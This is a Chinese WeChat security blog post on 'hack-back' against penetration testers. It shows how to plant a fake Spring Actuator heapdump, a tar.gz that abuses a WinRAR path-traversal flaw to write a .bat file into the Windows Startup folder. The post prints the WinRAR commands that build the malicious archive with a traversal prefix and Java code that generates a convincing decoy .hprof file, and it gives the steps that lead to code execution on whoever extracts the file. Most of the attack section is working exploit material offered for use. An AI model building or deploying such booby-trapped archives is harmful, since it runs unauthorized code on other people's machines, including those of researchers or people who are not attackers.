---
title: 学一招反置攻击者！
url: https://mp.weixin.qq.com/s/v1PEv2mTquqPoruN4Wum1A
source: Doonsec's feed
date: 2026-05-09
fetch_date: 2026-05-10T05:34:05.127369
---

# 学一招反置攻击者！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/OoQcGCictMqUO1Zbu53ddORia4iaWZFlhvqQJbaTPmBs9vbaX5JJ7yI9A606aibmA04lu9paJm6kpJflla0Bl9iblY4QvYUTYlLqrhJH4Dh5pxu4/0?wx_fmt=jpeg)

# 学一招反置攻击者！

天翁安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

编者荐语：

来自Firebasky大佬公众号处子作，一个WinRAR 路径穿越 + Spring Actuator Heapdump反置攻击者的新思路，大家支持一下！！！

以下文章来源于赛博翻桶人
，作者firebasky

![](http://wx.qlogo.cn/mmhead/iaRlzG8zy7BtGBQIvicZgslMmKdbxG4v2ekCfdJXgx8SZgjMoS2ljZM0ebicClhek1nGP2FZ9s65Cg/0)

**赛博翻桶人**
.

在漏洞和生活的垃圾堆里，寻找值得留下的东西。

## ◆ 前言

在知识星球里分享过一篇 weblogic 反置 的文章

可以联系作者免费加入知识星球

今天接着这个话题，再丢一个组合 —— **WinRAR 路径穿越 + Spring Actuator Heapdump**，拿来反置攻击者。

你不是喜欢下 heapdump 翻密码嘛？行，给你准备一份"加料"的。

## ◆ 攻击者怎么搞 Heapdump

搞过渗透的都清楚，Spring Boot Actuator 的 `/actuator/heapdump` 基本是必看的点。下回来丢 MAT 或者 VisualVM 里一翻，能捞出不少好东西：

* 数据库连接串、密码
* 各种 API Key、Secret
* JWT 签名密钥
* 内网服务地址

拿到 heapdump 第一步就是解压。这里有个点很多人没注意 —— **heapdump 可以是 `.tar.gz` 格式的**。

## ◆ 反置的思路

WinRAR 之前爆过好几个路径穿越的洞（CVE-2023-38831 这些），用漏洞版本解压特定构造的压缩包，文件可以直接写到任意目录。

这两个东西一拼，思路就出来了：

构造一个带路径穿越 payload 的 tar.gz，伪装成 heapdump。攻击者下载后用有漏洞的 WinRAR 解压，bat 脚本直接落到 Windows 启动目录，下次开机就执行了。

整个流程：

1. 在 Actuator 端点放上构造好的 heapdump（tar.gz 格式）
2. 攻击者扫到了，下载
3. 用 WinRAR 解压（漏洞版本）
4. 路径穿越触发，脚本写进 `Startup` 目录
5. 下次登录，自动执行 —— 反向 RCE 到手

## ◆ POC

### 制作恶意 tar.gz

BAT

echo calc.exe > POC.bat

::  先把正常的 heapdump 文件打包进去，做掩护

"C:\Program Files\WinRAR\WinRAR.exe" a heapdump.tar.gz "heapdump.hprof"

::  追加恶意文件，路径穿越直接指向启动目录

"C:\Program Files\WinRAR\WinRAR.exe" a -ap" \.. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" heapdump.tar.gz POC.bat

pause

几个关键点：

* `-ap`

  是 WinRAR 追加文件时指定路径前缀的参数
* `\\..\\..`

  往上跳两级，穿越到用户目录
* 最终写入 `Startup` 文件夹，开机自启
* 里面放了个正常的 `heapdump.hprof` 当幌子

### 生成一份像样的 heapdump

光有个空壳不行，得弄个有内容的 `.hprof` 文件，不然一眼就看出来了：

Java

import com.sun.management.HotSpotDiagnosticMXBean;

import java.lang.management.ManagementFactory;

import java.lang.management.MemoryMXBean;

import java.lang.management.MemoryUsage;

import java.util.ArrayList;

import java.util.List;

publicclassHeapDumpGenerator {

    // 目标大小：20 MB

    privatestaticfinallong TARGET\_SIZE\_BYTES = 20 \* 1024 \* 1024;

    privatestaticfinalint CHUNK\_SIZE\_MB = 1;

    publicstaticvoid main(String[] args) {

        System.out.println("开始生成堆转储文件...");

        System.out.println("目标大小: " + (TARGET\_SIZE\_BYTES / 1024 / 1024) + " MB");

        try {

            MemoryMXBean memoryMXBean = ManagementFactory.getMemoryMXBean();

            HotSpotDiagnosticMXBean hsBean = ManagementFactory

                .getPlatformMXBean(HotSpotDiagnosticMXBean.class);

            if (hsBean == null) {

                System.err.println("错误：当前 JVM 不支持 HotSpotDiagnosticMXBean");

                return;

            }

            List<byte[]> holder = new ArrayList<>();

            long currentHeapUsed = 0;

            int chunkBytes = CHUNK\_SIZE\_MB \* 1024 \* 1024;

            System.out.println("正在分配内存...");

            while (currentHeapUsed < TARGET\_SIZE\_BYTES) {

                byte[] chunk = newbyte[chunkBytes];

                for (int i = 0; i < chunk.length; i++) {

                    chunk[i] = (byte) (i % 256);

                }

                holder.add(chunk);

                System.gc();

                MemoryUsage usage = memoryMXBean.getHeapMemoryUsage();

                currentHeapUsed = usage.getUsed();

                System.out.printf("当前堆使用: %.2f MB / 目标: %.2f MB%%n",

                    currentHeapUsed / 1024.0 / 1024.0,

                    TARGET\_SIZE\_BYTES / 1024.0 / 1024.0);

                if (currentHeapUsed >= TARGET\_SIZE\_BYTES) {

                    break;

                }

            }

            String dumpFilePath = "heapdump.hprof";

            boolean liveObjectsOnly = false;

            System.out.println("正在写入文件: " + dumpFilePath);

            hsBean.dumpHeap(dumpFilePath, liveObjectsOnly);

            System.out.println("成功！Heap Dump 已生成至: " + dumpFilePath);

        } catch (Exception e) {

            e.printStackTrace();

        }

    }

}

## ◆ 前提条件

这个思路有几个限制得说清楚：

1. **对方 WinRAR 得是没补丁的版本**

   —— 新版早修了
2. **对方得在 Windows 上操作**

   —— Linux 用 tar 解压不吃这套
3. **你的 heapdump 端点得让对方能访问到**

   —— 蜜罐也好，故意暴露也好

## ◆ 最后

攻击者有自己的工具链和习惯，这些习惯里头也有漏洞可以利用。heapdump 是红队必翻的东西，WinRAR 是 Windows 上装机率最高的解压工具之一，两个一组合，就是一个不错的反制点。

你在找别人的洞，别人也可能在你的工具链里等着你。

多想一步，少踩一坑。

在知识星球写的weblogic反置,感兴趣可以看看：https://t.zsxq.com/rAvMb

可以联系作者免费加入知识星球

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S7ge51H7LqtXKmFUfJ6OSFXvTcvOgh4wl0sc4fOYkIyLV20MKWXaajttEbibFKUqh0SNV7UUicxuMxA/0?wx_fmt=png)

天翁安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/I2eHcAFia5S7ge51H7LqtXKmFUfJ6OSFXvTcvOgh4wl0sc4fOYkIyLV20MKWXaajttEbibFKUqh0SNV7UUicxuMxA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过